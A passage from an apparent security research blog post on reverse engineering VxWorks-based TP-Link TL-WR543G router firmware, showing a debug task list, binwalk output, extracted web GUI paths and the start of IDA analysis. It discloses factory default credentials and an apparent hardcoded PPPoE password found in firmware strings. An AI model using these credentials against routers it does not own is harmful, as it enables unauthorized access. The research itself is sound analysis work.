800de55c     80b6c8f0  10 PEND       801e3c50 80b6c800       0     0\nDetectd    80022638     80b631d0  40 DELAY      801db708 80b63148       0    48\ntimerManage8006d7f0     80d44780  48 PEND+T     80158414 80d44708  3d0004     2\nendRecvTask8005bce4     80b85020  49 PEND+T     801e3c50 80b84f10  3d0004     1\ntNetTask   8019aab4     80fa4c90  50 PEND       80158414 80fa4c00       0     0\ntApHouseKee800de9d0     80b74db0  50 DELAY      801db708 80b74d00       0  1533\ndot1xTask  800f3a3c     80b6fd20  50 PEND+T     80158414 80b6fa90  3d0002     6\ndhcpcState 800b4438     80de18d0  56 PEND       80158414 80de1830       0     0\ndhcpcRead  800b4e10     80de02d0  56 PEND       80158414 80de00b8  3d0002     0\nswDhcpcd   80062620     80dde870  56 PEND       801e3c50 80dde618       0     0\n802_1X     80093c40     80b680e0 150 PEND+T     80158414 80b68060  3d0004    26\nswL2tpd    80069944     80df8d80 198 PEND+T     801e3c50 80df8b08  3d0004    51\nswPptpd    8006b4c4     80df2130 198 PEND+T     801e3c50 80df1eb8  3d0004    50\nswPppoed   8006863c     80dfd670 199 PEND+T     801e3c50 80dfd3b0  3d0004    48\npppoed_0   8006fbd8     80dff8e0 200 PEND+T     801e3c50 80dff7c8  3d0004    17\npptpProc_0 8007aeac     80df43a0 200 PEND+T     801e3c50 80df4070  3d0004     1\nl2tpd_0    80075bd4     80dfaff0 201 PEND+T     801e3c50 80dfaed8  3d0004    15\npptpd_0    800785f0     80df6610 201 PEND+T     801e3c50 80df64f0  3d0004    13\nusrRebootd 80066648     80d452b0 202 PEND+T     801e3c50 80d451d0  3d0004    42\nmud0_80    8002dd40     80f0ebf0 203 PEND+T     80158414 80f0e9b0  3d0002   581\ntFWCONF    8008fbd8     80ddc960 203 DELAY      801db708 80ddc8d8       0   279\ndnsProxyd  800c0728     80d475e0 204 PEND+T     80158414 80d473e0  3d0002    38\nsntpd      800bf518     80d48e80 205 PEND+T     801e3c50 80d48d48  3d0004    37\nsysExLogd  800201b0     80f388a0 240 PEND       80158414 80f38488  3d0002     0\ndynTask    800c35fc     80d424d0 250 DELAY      801db708 80d42428       0    35\nBPAd_0     800cb6e0     80decc80 253 DELAY      801db708 80decb48       0    33\ndhcpsd     800a7688     80d4b3a0 254 PEND+T     80158414 80d4b178  3d0002    32\nBPAm_0     800ce5c0     80dea210 255 DELAY      801db708 80dea170       0    31\n</pre> \n  <p>However, I didn't find a way to get a shell through this menu :(</p> \n </div> \n</div> \n<div class=\"section\" id=\"firmware-analysis\"> \n <h2>Firmware analysis</h2> \n <p>Downloads:</p> \n <ul class=\"simple\"> \n  <li><a class=\"reference external\" href=\"https://www.tp-link.com/us/support/download/tl-wr543g/#Firmware\">Firmware (all available)</a></li> \n  <li><a class=\"reference external\" href=\"https://static.tp-link.com/resources/software/20081013145812.zip\">Download latest available version</a></li> \n  <li>Firmware running on my router: 3.7.1 Build 080904 Rel.62330n (latest available)</li> \n  <li>Hardware version: WR543G v2 08118989</li> \n </ul> \n <div class=\"section\" id=\"binwalk-analysis\"> \n  <h3>Binwalk analysis</h3> \n  <p>My first try with <a class=\"reference external\" href=\"https://github.com/ReFirmLabs/binwalk\">Binwalk</a> gave me these results:</p> \n  <pre class=\"literal-block\">\nfastix@bulin:~/wr543g$ binwalk wr543gv2-en-up.bin\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n20132         0x4EA4          Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n20228         0x4F04          VxWorks operating system version \"5.5.1\" , compiled: \"Sep  4 2008, 17:18:57\"\n20324         0x4F64          Copyright string: \"Copyright 1984-2002 Wind River Systems, Inc.\"\n21685         0x54B5          Zlib compressed data, default compression\n</pre> \n  <p>As seen in the output from <em>Binwalk</em>, there is a compilation header showing a string related to <em>VxWorks</em>, specifically, it seems that we are in front of <em>VxWorks 5.5.1</em>.</p> \n  <p>There is also a <em>Zlib</em> compressed stream at the end, starting at offset <em>0x54B5</em>. There are no signs of bootloader, filesystem, kernel, etc; probably, and with some luck, something is going to appear in the compressed stream.</p> \n  <p>In order to extract the <em>Zlib</em> compressed stream I just used the command <tt class=\"docutils literal\">binwalk <span class=\"pre\">-e</span> file.bin</tt>.</p> \n  <p>By looking at the strings on the uncompressed stream, there are some interesting details:</p> \n  <pre class=\"literal-block\">\nae(0,0)TP-MIPS:vxWorks h=192.168.1.18 e=192.168.1.5:0xffffff00 u=wr541 pw=123 f=0x0 tn=wr541 o=ae s=factory\nresetting to factory config.\n</pre> \n  <p>Apparently, when factory resetting the router, the default username and password combination is <em>wr541/123</em>.</p> \n  <p>If we use <em>Binwalk</em> again over the uncompressed stream, here is the result:</p> \n  <pre class=\"literal-block\">\nfastix@bulin:~/wr543g/_wr543gv2-en-up.bin.extracted$ binwalk 54B5\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n880412        0xD6F1C         Certificate in DER format (x509 v3), header length: 4, sequence length: 1\n880432        0xD6F30         Certificate in DER format (x509 v3), header length: 4, sequence length: 4\n1916528       0x1D3E70        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n1917168       0x1D40F0        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n1917808       0x1D4370        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n1918648       0x1D46B8        Unix path: /Tornado2.2.1-mips/target/config/ar2315/utility.c, line 393\n1918760       0x1D4728        Unix path: /Tornado2.2.1-mips/target/config/ar2315/utility.c, line 408\n1918852       0x1D4784        Unix path: /Tornado2.2.1-mips/target/config/ar2315/utility.c, line 423\n1918944       0x1D47E0        Unix path: /Tornado2.2.1-mips/target/config/ar2315/utility.c, line 468\n1919018       0x1D482A        Unix path: /depot/sw/branches/mBSSID_dev/src/ap/os/vxworks/target/config/ar531xPlus/ae531xEnd.c#1 $\n1919594       0x1D4A6A        Unix path: /Tornado2.2.1-mips/target/config/ar2315/ae531xEnd.c, line 319\n1919744       0x1D4B00        Unix path: /Tornado2.2.1-mips/target/config/ar2315/ae531xEnd.c, line 703\n1920008       0x1D4C08        Unix path: /Tornado2.2.1-mips/target/config/ar2315/ae531xEnd.c, line 2188\n1922144       0x1D5460        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n1923290       0x1D58DA        Unix path: /depot/sw/branches/mBSSID_dev/src/ap/os/vxworks/target/config/ar531xPlus/sysLib.c#1 $\n1937472       0x1D9040        CRC32 polynomial table, big endian\n1938879       0x1D95BF        Copyright string: \"Copyright 1995-2002 Jean-loup Gailly \"\n1939471       0x1D980F        Copyright string: \"Copyright 1995-2002 Mark Adler \"\n1945225       0x1DAE89        HTML document footer\n1945892       0x1DB124        HTML document header\n1947067       0x1DB5BB        HTML document footer\n1947076       0x1DB5C4        HTML document header\n1947285       0x1DB695        HTML document footer\n1947352       0x1DB6D8        HTML document header\n1947392       0x1DB700        HTML document header\n1949774       0x1DC04E        HTML document footer\n1954280       0x1DD1E8        Unix path: /rc_filesys/doc/dynaform/common.js\n1954508       0x1DD2CC        Unix path: /rc_filesys/doc/frames/top.htm\n1959104       0x1DE4C0        HTML document header\n1960860       0x1DEB9C        HTML document footer\n1960868       0x1DEBA4        GIF image data, version \"87a\", 16 x 41\n1968256       0x1E0880        GIF image data, version \"89a\", 220 x 146\n1973772       0x1E1E0C        GIF image data, version \"89a\", 10 x 10\n1973832       0x1E1E48        GIF image data, version \"89a\", 10 x 10\n1973896       0x1E1E88        GIF image data, version \"89a\", 160 x 72\n1978532       0x1E30A4        GIF image data, version \"89a\", 10 x 10\n1978592       0x1E30E0        JPEG image data, JFIF standard 1.01\n1982668       0x1E40CC        JPEG image data, JFIF standard 1.01\n1992460       0x1E670C        JPEG image data, JFIF standard 1.02\n1992490       0x1E672A        TIFF image data, little-endian offset of first image directory: 8\n1993684       0x1E6BD4        JPEG image data, JFIF standard 1.01\n1994112       0x1E6D80        HTML document header\n1994236       0x1E6DFC        HTML document footer\n1997632       0x1E7B40        HTML document header\n2006161       0x1E9C91        HTML document footer\n2010912       0x1EAF20        HTML document header\n2013167       0x1EB7EF        HTML document footer\n2018806       0x1ECDF6        Copyright string: \"Copyright(C) 2001-2004 by %s\"\n2023168       0x1EDF00        Unix path: /core/bsp/archives/ar2315/ar531xPlusreg.h-arc   1.5   01 Jun 2006 11:40:30   dai  $\n2032413       0x1F031D        Copyright string: \"Copyright 2000 Wind River Systems, Inc.\"\n2032645       0x1F0405        Copyright string: \"Copyright 2001 Wind River Systems, Inc.\"\n2032737       0x1F0461        Copyright string: \"Copyright 2001 Wind River Systems, Inc.\"\n2043168       0x1F2D20        XML document, version: \"1.0\"\n2043572       0x1F2EB4        XML document, version: \"1.0\"\n2047104       0x1F3C80        HTML document header\n2047136       0x1F3CA0        HTML document footer\n2061824       0x1F7600        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n2069248       0x1F9300        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n2069760       0x1F9500        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n2070160       0x1F9690        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n2072000       0x1F9DC0        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n2072688       0x1FA070        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n2074288       0x1FA6B0        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n2074784       0x1FA8A0        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n2075088       0x1FA9D0        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n2075584       0x1FABC0        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n2076944       0x1FB110        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n2078192       0x1FB5F0        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n2080528       0x1FBF10        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n2082896       0x1FC850        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n2085056       0x1FD0C0        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n2086560       0x1FD6A0        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n2087408       0x1FD9F0        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n2087936       0x1FDC00        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n2089984       0x1FE400        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n2090224       0x1FE4F0        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n2090464       0x1FE5E0        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n2090816       0x1FE740        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n2091328       0x1FE940        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n2091558       0x1FEA26        Unix path: /depot/sw/releases/4.1.2/src/hal/halUtil.c#1 $\n2092010       0x1FEBEA        Unix path: /depot/sw/releases/4.1.2/src/hal/halBeacon.c#1 $\n2095206       0x1FF866        Unix path: /depot/sw/releases/4.1.2/src/hal/ar5212/ar5212Attach.c#9 $\n2099696       0x2009F0        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n2100512       0x200D20        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n2101040       0x200F30        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n2101600       0x201160        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n2103120       0x201750        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n2103376       0x201850        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n2103888       0x201A50        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n2105808       0x2021D0        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n2106592       0x2024E0        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n2107296       0x2027A0        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n2107920       0x202A10        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n2118544       0x205390        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n2121168       0x205DD0        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n2121488       0x205F10        Unix path: /core/bsp/archives/ar2315/ar531xPlus.h-arc   1.4   Dec 27 2005 15:00:04   dai  $\n2159077       0x20F1E5        Unix path: /../ip_qos/src/config/qosTask.c, line 102\n2159268       0x20F2A4        Unix path: /../ip_qos/src/config/qosTask.c, line 252\n2159348       0x20F2F4        Unix path: /../ip_qos/src/config/qosTask.c, line 275\n2159446       0x20F356        Unix path: /../ip_qos/src/config/qosTask.c, line 303\n2159540       0x20F3B4        Unix path: /../ip_qos/src/config/qosTask.c, line 315\n2159633       0x20F411        Unix path: /../ip_qos/src/config/qosTask.c, line 323\n2159736       0x20F478        Unix path: /../ip_qos/src/config/qosTask.c, line 370\n2159816       0x20F4C8        Unix path: /../ip_qos/src/config/qosTask.c, line 417\n2159903       0x20F51F        Unix path: /../ip_qos/src/config/qosTask.c, line 443\n2160026       0x20F59A        Unix path: /../ip_qos/src/core/qos_coreSch.c, line 206\n2160114       0x20F5F2        Unix path: /../ip_qos/src/core/qos_coreSch.c, line 217\n2160198       0x20F646        Unix path: /../ip_qos/src/core/qos_coreSch.c, line 254\n2160295       0x20F6A7        Unix path: /../ip_qos/src/core/qos_coreSch.c, line 364\n2160368       0x20F6F0        Unix path: /../ip_qos/src/core/qos_coreSch.c, line 460\n2160471       0x20F757        Unix path: /../ip_qos/src/core/qos_coreSch.c, line 488\n2160564       0x20F7B4        Unix path: /../ip_qos/src/core/qos_coreSch.c, line 491\n2160672       0x20F820        Unix path: /../ip_qos/src/core/qos_coreSch.c, line 501\n2160774       0x20F886        Unix path: /../ip_qos/src/core/qos_coreSch.c, line 502\n2160848       0x20F8D0        Unix path: /../ip_qos/src/core/qos_coreSch.c, line 583\n2160953       0x20F939        Unix path: /../ip_qos/src/core/qos_coreSch.c, line 776\n2161057       0x20F9A1        Unix path: /../ip_qos/src/core/qos_coreSch.c, line 813\n2161159       0x20FA07        Unix path: /../ip_qos/src/core/qos_coreSch.c, line 830\n2161261       0x20FA6D        Unix path: /../ip_qos/src/core/qos_coreSch.c, line 850\n2161365       0x20FAD5        Unix path: /../ip_qos/src/core/qos_coreSch.c, line 886\n2161465       0x20FB39        Unix path: /../ip_qos/src/core/qos_coreSch.c, line 1088\n2161553       0x20FB91        Unix path: /../ip_qos/src/core/qos_coreSch.c, line 1253\n2161650       0x20FBF2        Unix path: /../ip_qos/src/core/qos_coreSch.c, line 1256\n2161731       0x20FC43        Unix path: /../ip_qos/src/core/qos_coreSch.c, line 1274\n2161873       0x20FCD1        Unix path: /../ip_qos/src/if_config/qos_IFConfig.c, line 97\n2161957       0x20FD25        Unix path: /../ip_qos/src/if_config/qos_IFConfig.c, line 141\n2162043       0x20FD7B        Unix path: /../ip_qos/src/if_config/qos_IFConfig.c, line 147\n2162146       0x20FDE2        Unix path: /../ip_qos/src/if_config/qos_IFConfig.c, line 164\n2162233       0x20FE39        Unix path: /../ip_qos/src/if_config/qos_IFConfig.c, line 278\n2162317       0x20FE8D        Unix path: /../ip_qos/src/if_config/qos_IFConfig.c, line 285\n2162404       0x20FEE4        Unix path: /../ip_qos/src/if_config/qos_IFConfig.c, line 297\n2162492       0x20FF3C        Unix path: /../ip_qos/src/if_config/qos_IFConfig.c, line 298\n2162606       0x20FFAE        Unix path: /../ip_qos/src/if_config/qos_IFConfig.c, line 394\n2162693       0x210005        Unix path: /../ip_qos/src/if_config/qos_IFConfig.c, line 483\n2162777       0x210059        Unix path: /../ip_qos/src/if_config/qos_IFConfig.c, line 490\n2162864       0x2100B0        Unix path: /../ip_qos/src/if_config/qos_IFConfig.c, line 506\n2162952       0x210108        Unix path: /../ip_qos/src/if_config/qos_IFConfig.c, line 507\n2163042       0x210162        Unix path: /../ip_qos/src/if_config/qos_IFConfig.c, line 516\n2163135       0x2101BF        Unix path: /../ip_qos/src/if_config/qos_IFConfig.c, line 519\n2163226       0x21021A        Unix path: /../ip_qos/src/if_config/qos_IFConfig.c, line 520\n2163318       0x210276        Unix path: /../ip_qos/src/if_config/qos_IFConfig.c, line 523\n2163405       0x2102CD        Unix path: /../ip_qos/src/if_config/qos_IFConfig.c, line 534\n2163489       0x210321        Unix path: /../ip_qos/src/if_config/qos_IFConfig.c, line 536\n2163719       0x210407        Unix path: /../ip_qos/src/if_config/qos_IFConfig.c, line 640\n2163815       0x210467        Unix path: /../ip_qos/src/if_config/qos_IFConfig.c, line 721\n2163896       0x2104B8        Unix path: /../ip_qos/src/if_config/qos_IFConfig.c, line 747\n2163984       0x210510        Unix path: /../ip_qos/src/if_config/qos_IFConfig.c, line 782\n2164066       0x210562        Unix path: /../ip_qos/src/if_config/qos_IFConfig.c, line 835\n2164266       0x21062A        Unix path: /../ip_qos/src/if_config/qos_IFConfig.c, line 880\n2164484       0x210704        Unix path: /../ip_qos/src/if_config/testcase.c, line 180\n2166310       0x210E26        Unix path: /core/bsp/archives/ar2315/ae531xEnd.h-arc   1.4   10 Dec 2005 10:03:34   lqm  $\n2166996       0x2110D4        Unix path: /../ip_qos/src/core/qos_coreAckFirstFifo.c, line 194\n2167160       0x211178        Unix path: /../ip_qos/src/core/qos_coreAckFirstFifo.c, line 229\n2167274       0x2111EA        Unix path: /../ip_qos/src/common/memPool.c, line 32\n2167356       0x21123C        Unix path: /../ip_qos/src/common/memPool.c, line 40\n2167440       0x211290        Unix path: /../ip_qos/src/common/memPool.c, line 63\n2167605       0x211335        Unix path: /../ip_qos/src/common/memPool.c, line 67\n2167701       0x211395        Unix path: /../ip_qos/src/common/memPool.c, line 68\n2167784       0x2113E8        Unix path: /../ip_qos/src/common/memPool.c, line 74\n2167868       0x21143C        Unix path: /../ip_qos/src/common/memPool.c, line 80\n2167954       0x211492        Unix path: /../ip_qos/src/common/memPool.c, line 86\n2168038       0x2114E6        Unix path: /../ip_qos/src/common/memPool.c, line 92\n2168135       0x211547        Unix path: /../ip_qos/src/common/memPool.c, line 120\n2168234       0x2115AA        Unix path: /../ip_qos/src/common/memPool.c, line 139\n2168331       0x21160B        Unix path: /../ip_qos/src/config/qos_Config.c, line 59\n2168438       0x211676        Unix path: /../ip_qos/src/config/qos_Config.c, line 68\n2168542       0x2116DE        Unix path: /../ip_qos/src/config/qos_Config.c, line 89\n2168630       0x211736        Unix path: /../ip_qos/src/config/qos_Config.c, line 136\n2168716       0x21178C        Unix path: /../ip_qos/src/config/qos_Config.c, line 289\n2168808       0x2117E8        Unix path: /../ip_qos/src/config/qos_Config.c, line 366\n2168896       0x211840        Unix path: /../ip_qos/src/config/qos_Config.c, line 394\n2168984       0x211898        Unix path: /../ip_qos/src/config/qos_Config.c, line 418\n2169173       0x211955        Unix path: /../ip_qos/src/config/qos_htbConfig.c, line 262\n2169296       0x2119D0        Unix path: /../ip_qos/src/config/qos_htbConfig.c, line 328\n2169705       0x211B69        Unix path: /../ip_qos/src/config/qos_htbDump.c, line 184\n2169805       0x211BCD        Unix path: /../ip_qos/src/config/qos_htbDump.c, line 187\n2169957       0x211C65        Unix path: /../ip_qos/src/config/qos_htbDump.c, line 208\n2170171       0x211D3B        Unix path: /../ip_qos/src/config/qos_htbDump.c, line 221\n2170260       0x211D94        Unix path: /../ip_qos/src/core/qos_coreFifo.c, line 62\n2170344       0x211DE8        Unix path: /../ip_qos/src/core/qos_coreFifo.c, line 87\n2170428       0x211E3C        Unix path: /../ip_qos/src/core/qos_coreFifo.c, line 118\n2170512       0x211E90        Unix path: /../ip_qos/src/core/qos_coreFifo.c, line 169\n2170644       0x211F14        Unix path: /../ip_qos/src/core/qos_coreGeneric.c, line 117\n2170732       0x211F6C        Unix path: /../ip_qos/src/core/qos_coreGeneric.c, line 146\n2170859       0x211FEB        Unix path: /../ip_qos/src/core/qos_coreGeneric.c, line 192\n2170972       0x21205C        Unix path: /../ip_qos/src/core/qos_coreGeneric.c, line 199\n2171071       0x2120BF        Unix path: /../ip_qos/src/core/qos_coreGeneric.c, line 205\n2171173       0x212125        Unix path: /../ip_qos/src/core/qos_coreGeneric.c, line 206\n2171271       0x212187        Unix path: /../ip_qos/src/core/qos_coreGeneric.c, line 213\n2171371       0x2121EB        Unix path: /../ip_qos/src/core/qos_coreHtb.c, line 217\n2171459       0x212243        Unix path: /../ip_qos/src/core/qos_coreHtb.c, line 237\n2171533       0x21228D        Unix path: /../ip_qos/src/core/qos_coreHtb.c, line 1414\n2171648       0x212300        Unix path: /../ip_qos/src/core/qos_coreHtb.c, line 1669\n2171737       0x212359        Unix path: /../ip_qos/src/core/qos_coreHtb.c, line 1683\n2171958       0x212436        Unix path: /../ip_qos/src/core/qos_coreHtb.c, line 2527\n2172160       0x212500        Unix path: /../ip_qos/src/core/qos_coreHtb.c, line 2728\n2172263       0x212567        Unix path: /../ip_qos/src/core/qos_coreHtb.c, line 2732\n2172374       0x2125D6        Unix path: /../ip_qos/src/if_config/qos_IFClassifier.c, line 33\n2172467       0x212633        Unix path: /../ip_qos/src/if_config/qos_IFClassifier.c, line 34\n2172555       0x21268B        Unix path: /../ip_qos/src/if_config/qos_IFClassifier.c, line 48\n2172652       0x2126EC        Unix path: /../ip_qos/src/if_config/qos_IFClassifier.c, line 49\n2172739       0x212743        Unix path: /../ip_qos/src/if_config/qos_IFClassifier.c, line 66\n2172852       0x2127B4        Unix path: /../ip_qos/src/if_config/qos_IFClassifier.c, line 67\n2172939       0x21280B        Unix path: /../ip_qos/src/if_config/qos_IFClassifier.c, line 138\n2173063       0x212887        Unix path: /../ip_qos/src/common/qos_map.c, line 24\n2173147       0x2128DB        Unix path: /../ip_qos/src/common/qos_map.c, line 27\n2173231       0x21292F        Unix path: /../ip_qos/src/common/qos_map.c, line 43\n2173313       0x212981        Unix path: /../ip_qos/src/common/qos_map.c, line 53\n2173398       0x2129D6        Unix path: /../ip_qos/src/common/qos_map.c, line 80\n2173480       0x212A28        Unix path: /../ip_qos/src/common/qos_map.c, line 82\n2173572       0x212A84        Unix path: /../ip_qos/src/common/qos_map.c, line 98\n2174160       0x212CD0        VxWorks operating system version \"5.5.1\" , compiled: \"Sep  4 2008, 17:18:51\"\n2191631       0x21710F        HTML document footer\n[..]\n[cut for brevity. What followed here were a lot of HTML document footers]\n[..]\n2556403       0x2701F3        Copyright string: \"Copyright 1999, Mark Martinec. Frontier Artistic License applies.\"\n2558288       0x270950        XML document, version: \"1.0\"\n2561036       0x27140C        XML document, version: \"1.0\"\n2561868       0x27174C        XML document, version: \"1.0\"\n2563832       0x271EF8        XML document, version: \"1.0\"\n2575992       0x274E78        Base64 standard index table\n2576304       0x274FB0        XML document, version: \"1.0\"\n2580992       0x276200        Base64 standard index table\n2661593       0x289CD9        Copyright string: \"Copyright 1984-2002 Wind River Systems, Inc.\"\n2666394       0x28AF9A        VxWorks WIND kernel version \"2.6\"\n</pre> \n  <p>OK, a lot of HTMLs/GIFs/XMLs/etc, a lot of Web stuff. Even, if we grep a little bit more, we find references to HTML files required to call each of the functions available from the Web GUI:</p> \n  <pre class=\"literal-block\">\n/userRpm/FirmwareUpdateTemp.htm\n/userRpm/ConfUpdateTemp.htm\n/userRpm/MenuRpm.htm\n/userRpm/MainRpm.htm\n/userRpm/StatusRpm.htm\n/userRpm/StatusHelpRpm.htm\n/userRpm/WzdStartRpm.htm\n/userRpm/WzdOpModeRpm.htm\n/userRpm/WzdWanTypeRpm.htm\n/userRpm/WzdStaticIpRpm.htm\n/userRpm/WzdDynaIpRpm.htm\n/userRpm/WzdPPPoERpm.htm\n/userRpm/WzdEndRpm.htm\n/userRpm/WzdStaticIpHelpRpm.htm\n/userRpm/WzdStartHelpRpm.htm\n/userRpm/WzdOpModeHelpRpm.htm\n/userRpm/WzdWanTypeHelpRpm.htm\n/userRpm/WzdPPPoEHelpRpm.htm\n/userRpm/WzdFinishHelpRpm.htm\n/userRpm/WzdWlanRpm.htm\n/userRpm/WzdWlanHelpRpm.htm\n/userRpm/NatDebugRpm26525557.htm\n/userRpm/NetworkCfgRpm.htm\n/userRpm/WanStaticIpCfgRpm.htm\n/userRpm/WanDynamicIpCfgRpm.htm\n/userRpm/WanCfgRpm.htm\n/userRpm/PPPoECfgRpm.htm\n/userRpm/PPPoECfgAdvRpm.htm\n/userRpm/MacCloneCfgRpm.htm\n/userRpm/WanBpaCfgRpm.htm\n/userRpm/WanBpaCfgHelpRpm.htm\n/userRpm/L2TPCfgRpm.htm\n/userRpm/L2tpCfgHelpRpm.htm\n/userRpm/PPTPCfgRpm.htm\n/userRpm/PptpCfgHelpRpm.htm\n/userRpm/NetworkCfgHelpRpm.htm\n/userRpm/WanStaticIpCfgHelpRpm.htm\n/userRpm/WanDynamicIpCfgHelpRpm.htm\n/userRpm/PPPoECfgHelpRpm.htm\n/userRpm/MacCloneCfgHelpRpm.htm\n/userRpm/WanStaticIpCfgRpm_8021X.htm\n/userRpm/WanDynamicIpCfgRpm_8021X.htm\n...\n</pre> \n  <p>Also, by looking at the strings, we can derive interesting information related to logins:</p> \n  <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/strings1.PNG\" style=\"width: 275px;\" /> \n  <p>The <a class=\"reference external\" href=\"https://blog.nirsoft.net/2010/06/24/recover-l2tp-pptp-pppoe-ddns-password-from-the-router-web-interface/\">Hello123World</a> string, apparently, is the password for the <a class=\"reference external\" href=\"https://en.wikipedia.org/wiki/Point-to-Point_Protocol_over_Ethernet\">PPPoE</a> service login.</p> \n  <p>All the things we found are good things so far, but where are the binaries? There are no signs of code nor other compressed streams that can contain them. At this point, I was thinking that if this <em>Zlib</em> uncompressed stream only contains Web stuff, how are binary files updated in the router? It happens that, sometimes, IoT vendors publish two types of firmwares for their devices, one that holds the Web stuff and another firmware file that contains the binary files. This is not the case but it happens, for example, with IP cameras.</p> \n  <p>In order to make sure I wasn't missing something, I checked the old firmware files I had for this device but the results where the same, same structure, only one <em>Zlib</em> compressed stream containing Web stuff. At this point I was thinking that, maybe, as I was dealing with a proprietary OS, the firmware file does not include some parts, probably, the boot loader is missing from the firmware update file. However, other stuff as the file system must be present thus some binary code should be also present too. Are these binaries compressed, encrypted or obfuscated in some way?</p> \n  <p>I just did a quick check using <em>Binwalk</em> again to see if I could find any code in the uncompressed stream. <em>Binwalk</em> has the <a class=\"reference external\" href=\"https://github.com/ReFirmLabs/binwalk/wiki/Usage#-y---disasm\">-Y</a> switch:</p> \n  <pre class=\"literal-block\">\nAttempts to identify the CPU architecture of executable code contained in a file using the capstone disassembler\n</pre> \n  <p>This was the result:</p> \n  <pre class=\"literal-block\">\nfastix@bulin:~/wr543g/_wr543gv2-en-up.bin.extracted$ binwalk -Y 54B5\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n0             0x0             MIPS executable code, 32/64-bit, big endian, at least 1250 valid instructions\n</pre> \n  <p>Bingo! some <em>MIPS</em> code, big endian, is present starting at offset 0.</p> \n  <p>OK, so far, we have some Web stuff mixed with some <em>MIPS</em> code. This is not weird, embedded devices commonly implement a single binary that acts as different servers (HTTP, FTP, etc;) and has embedded data, as in this case.</p> \n  <p>Then, I tried to load the uncompressed stream in <a class=\"reference external\" href=\"https://www.hex-rays.com/products/ida/\">IDA</a>, I selected the <em>MIPS big endian [mipsb]</em> processor type and immediately, IDA showed a new window requesting some data from me to load the file:</p> \n  <img alt=\"\" class=\"align-center\" 